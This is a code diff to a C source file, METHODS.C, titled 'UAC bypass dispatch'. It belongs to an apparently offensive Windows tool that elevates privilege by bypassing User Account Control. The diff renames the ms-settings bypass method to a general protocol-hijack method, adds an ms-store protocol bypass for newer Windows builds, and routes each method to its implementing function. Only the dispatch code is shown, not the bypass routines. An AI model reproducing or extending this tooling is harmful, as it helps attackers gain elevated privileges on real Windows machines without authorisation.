@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2020
+*  (C) COPYRIGHT AUTHORS, 2015 - 2021
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.54
+*  VERSION:     3.55
 *
-*  DATE:        26 Dec 2020
+*  DATE:        02 Mar 2021
 *
 *  UAC bypass dispatch.
 *
@@ -43,7 +43,7 @@ UCM_API(MethodDeprecated);
 UCM_API(MethodIeAddOnInstall);
 UCM_API(MethodWscActionProtocol);
 UCM_API(MethodFwCplLua2);
-UCM_API(MethodMsSettingsProtocol);
+UCM_API(MethodProtocolHijack);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -51,7 +51,9 @@ ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodNICPoison,
     UacMethodIeAddOnInstall,
     UacMethodWscActionProtocol,
-    UacMethodFwCplLua2
+    UacMethodFwCplLua2,
+    UacMethodMsSettingsProtocol,
+    UacMethodMsStoreProtocol
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
@@ -122,7 +124,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodIeAddOnInstall, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodWscActionProtocol, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodFwCplLua2, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodMsSettingsProtocol, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
+    { MethodProtocolHijack, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodProtocolHijack, { 17763, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
 };
 
 /*
@@ -675,11 +678,9 @@ UCM_API(MethodFwCplLua2)
     return ucmFwCplLuaMethod2(lpszPayload);
 }
 
-UCM_API(MethodMsSettingsProtocol)
+UCM_API(MethodProtocolHijack)
 {
     LPWSTR lpszPayload = NULL;
-
-    UNREFERENCED_PARAMETER(Parameter);
 
     //
     // Select target application or use given by optional parameter.
@@ -689,5 +690,13 @@ UCM_API(MethodMsSettingsProtocol)
     else
         lpszPayload = g_ctx->szOptionalParameter;
 
-    return ucmMsSettignsProtocolMethod(lpszPayload);
+    switch (Parameter->Method) {
+    case UacMethodMsSettingsProtocol:
+        return ucmMsSettignsProtocolMethod(lpszPayload);
+    case UacMethodMsStoreProtocol:
+        return ucmMsStoreProtocolMethod(lpszPayload);
+    default:
+        return STATUS_ACCESS_DENIED;
+    }
+
 }
